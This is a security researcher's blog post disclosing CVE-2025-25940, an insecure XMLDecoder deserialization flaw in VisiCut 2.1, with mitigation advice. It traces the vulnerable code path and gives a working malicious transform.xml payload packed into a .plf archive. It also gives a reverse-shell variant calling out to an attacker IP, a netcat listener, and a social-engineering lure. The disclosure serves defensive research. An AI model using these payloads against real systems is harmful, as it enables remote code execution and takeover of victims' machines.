---
title:  "CVE-2025-25940: Deserialization Vulnerability in Visicut 2.1"
date:   2025-03-06
tags: [posts]
excerpt: "Discovery of CVE-2025-25940"
---
Discovery of CVE-2025-25940
---
A new part of my weekly routine is to read through the most recently published CVEs to get an idea of the types of vulnerabilities being reported. I came upon vulnerabilities focused on deserialization. I decided to do a deep dive into researching deserialization and eventually ended up discovering and reporting a deserialization vulnerability of my own: **CVE-2025-25940**.

### **What is Serialization and Why is it Dangerous?**
Serialization is the process of converting an object into a format (e.g., XML, JSON) that can be stored or transmitted and later reconstructed. Deserialization is the reverse process, converting serialized data back into objects. However, if deserialization is performed on untrusted data without proper validation, attackers can inject malicious objects and execute arbitrary code.

A great video explaining deserialization exploitation is available here: [Exploit Java Deserialization](https://www.youtube.com/watch?v=KSA7vUkXGSg) by Frohoff.

For Java deserialization exploits, tools like [ysoserial](https://github.com/frohoff/ysoserial) can generate payloads to exploit insecure deserialization.

The vulnerability I discovered in VisiCut 2.1 is a vulnerability in XML deserialization, in which the use of a vulnerable XML decoder allowed me to execute arbitrary code on a system running the affected software. 

## High-level Overview of CVE-2025-25940
VisiCut 2.1 allows code execution via **insecure XML deserialization** in the `loadPlfFile` method of `VisicutModel.java`. This vulnerability occurs because the software uses `java.beans.XMLDecoder` to process XML input, which is inherently insecure when handling untrusted data.


## Vulnerable Code:

[VisicutModel.java](https://github.com/t-oster/VisiCut/blob/87daf9a5f665debb8d27bce116022602b7c9e6a8/src/main/java/de/thomas_oster/visicut/VisicutModel.java#L525)
```java
  public PlfFile loadPlfFile(MappingManager mm, File f, List<String> warnings) throws IOException {
    ZipFile zip = new ZipFile(f);
    PlfFile resultingFile = new PlfFile();
    resultingFile.setFile(f);
    //Collect for each part the transform,mapping and sourceFile
    Map<Integer,AffineTransform> transforms = new LinkedHashMap<>();
    Map<Integer,MappingSet> mappings = new LinkedHashMap<>();
    Map<Integer,File> sourceFiles = new LinkedHashMap<>();
    Enumeration<? extends ZipEntry> entries = zip.entries();
    while (entries.hasMoreElements())
    {
      ZipEntry entry = entries.nextElement();
      String name = entry.getName();
      Integer i = name.matches("[0-9]+/.*") ? Integer.parseInt(name.split("/")[0]) : 0;
      if (name.equals((i > 0 ? i+"/" : "")+"transform.xml"))
      {
        XMLDecoder decoder = new XMLDecoder(zip.getInputStream(entry));
        transforms.put(i, (AffineTransform) decoder.readObject());
      }
```

The vulnerable lines of code are lines 525 and 526. In order to reach this code, our malicious xml file needs to contain the name of ```transform.xml```.

```java
if (name.equals((i > 0 ? i+"/" : "")+"transform.xml")) // XML needs to be called transform.xml
      {
        XMLDecoder decoder = new XMLDecoder(zip.getInputStream(entry)); // Vulnerable
        transforms.put(i, (AffineTransform) decoder.readObject()); // Unsafe Deserialization
      }
```

The loadPlfFile method is called in line 462:

```java
 public void loadFile(MappingManager mm, File file, List<String> warnings, boolean discardCurrent) throws IOException, ImportException
  {
    if (PLFFilter.accept(file))
    {
      PlfFile newFile = loadPlfFile(mm, file, warnings);
      if (newFile != null)
      {
        if (discardCurrent)
        {
          this.setPlfFile(newFile);
        }
        else
        {
          if (!newFile.isEmpty())
          {
            for (PlfPart p : newFile)
            {
              this.plfFile.add(p);
              this.propertyChangeSupport.firePropertyChange(PROP_PLF_PART_ADDED, null, p);
            }
            this.setSelectedPart(newFile.get(newFile.size() - 1));
          }
        }
      }
    }
```

In order to reach line 462, the output of ```PLFFilter.accept(file)``` must be true. This filter is defined on line 105:

```java
public static final FileFilter PLFFilter = new ExtensionFilter(".plf", "VisiCut Portable Laser Format (*.plf)");
```

Understanding that our zip file must have the .plf extension, we can move on to figuring out where the loadFile method is called.


There are 11 references to it in PreviewPanelKeyboardMouseHandler.java, MainView.java, and VicicutApp.Java.


Looking at the options, we do not want the calls that create a new File because we are going to want to supply our own malicious .plf file. 

After a little bit of code review, we see that line 1951 of MainView.java is the location where we will load our file. Here we see that loadFile is called from the openFileDialog method.
[loadFile](https://github.com/t-oster/VisiCut/blob/master/src/main/java/de/thomas_oster/visicut/gui/MainView.java#L1951)
```java
private void openFileDialog(boolean discardCurrent)
  {
    final FileFilter allFilter = VisicutModel.getInstance().getAllFileFilter();
    //On Mac os, awt.FileDialog looks more native
    if (Helper.isMacOS() || Helper.isLinux())
    {
      FileDialog openFileChooser = new FileDialog(this, bundle.getString("PLEASE SELECT A FILE"));
      openFileChooser.setMode(FileDialog.LOAD);
      if (lastDirectory != null)
      {
        openFileChooser.setDirectory(lastDirectory.getAbsolutePath());
      }
      openFileChooser.setFilenameFilter(new FilenameFilter()
      {

        public boolean accept(File dir, String file)
        {
          return allFilter.accept(new File(dir, file));
        }
      });
      openFileChooser.setVisible(true);
      if (openFileChooser.getFile() != null)
      {
        File file = new File(new File(openFileChooser.getDirectory()), openFileChooser.getFile());
        loadFile(file, discardCurrent);
      }
    }
```
<img src="{{ site.url }}{{ site.baseurl }}/images/CVE-2025-03-06-VisiCut.JPG" alt="">

To summarize:
1. **malicious XML file** named `transform.xml` must be placed inside a `.plf` archive.
2. The `loadPlfFile` method is triggered bypassing the **PLFFilter check:** The file extension must be `.plf` (defined in `ExtensionFilter`).
3. **loadFile method (line 462) calls loadPlfFile** if the file meets the filter criteria.
4. **openFileDialog method in `MainView.java` (line 1951) triggers `loadFile` when a user selects a file.**

With this knowledge, lets first create our malicious plf and open it up in the VisiCut Java application. 

## **Proof-of-Concept: Creating a Malicious Payload**
To exploit this vulnerability, we create an XML payload that executes arbitrary system commands when deserialized:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_181" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
        <string>sh</string>
      </void>
      <void index="1">
        <string>-c</string>
      </void>
      <void index="2">
        <string>echo hello > /tmp/poc_test.txt</string>
      </void>
    </array>
    <void method="start"/>
  </object>
</java>
```

Now, we package this XML file inside a `.plf` archive:

```bash
zip payload.plf transform.xml
```

Next, we open **VisiCut**, load the `.plf` file, and confirm that `/tmp/poc_test.txt` is created.

<img src="{{ site.url }}{{ site.baseurl }}/images/CVE-2025-03-06-VisiCut-Opened.JPG" alt="">


<img src="{{ site.url }}{{ site.baseurl }}/images/CVE-2025-03-06-POC-Test.JPG" alt="">

## **Attack Path: Reverse Shell Execution**
For a real attack scenario, we modify `transform.xml` to execute a reverse shell.

In this scenario, let's say I have been able to social engineer a user of VisiCut to open up a cool new laser cutting image that I created! But what I have provided is a malicious.plf that will spawn a reverse shell to my system.

The contents of transform.xml will be. 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_181" class="java.beans.XMLDecoder">
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
        <string>sh</string>
      </void>
      <void index="1">
        <string>-c</string>
      </void>
      <void index="2">
        <string>sh -i >& /dev/tcp/192.168.35.130/9001 0>&1</string>
      </void>
    </array>
    <void method="start"/>
  </object>
</java>

```

On my attacker machine, I start up a netcat listener.

```bash
nc -nvlp 9001
```

When the victim loads our `.plf` file, we receive a shell!

## **Mitigation and Patch**
The creator of VisiCut released a patch that mitigates this vulnerability by replacing `XMLDecoder` with a safer parsing method. If you are using VisiCut, ensure you update to the latest version.

**Mitigation Steps:**
1. **Update to the patched version** of VisiCut.
2. **Avoid using `XMLDecoder`** on untrusted input.
3. **Implement a whitelist of allowed classes** if deserialization is required.
4. **Use a safer XML parser** such as Jackson, XStream (with proper security settings), or JAXB.

## **Conclusion**
This was an interesting vulnerability to research. Reviewing the source code of an open-source project provided a great opportunity to learn about insecure deserialization and how Java applications handle file inputs. Props to the VisiCut team for promptly patching the issue after disclosure!

References
---
1. NIST CVE Link
2. CVE Link
3. [VisiCut Site](https://visicut.org/)
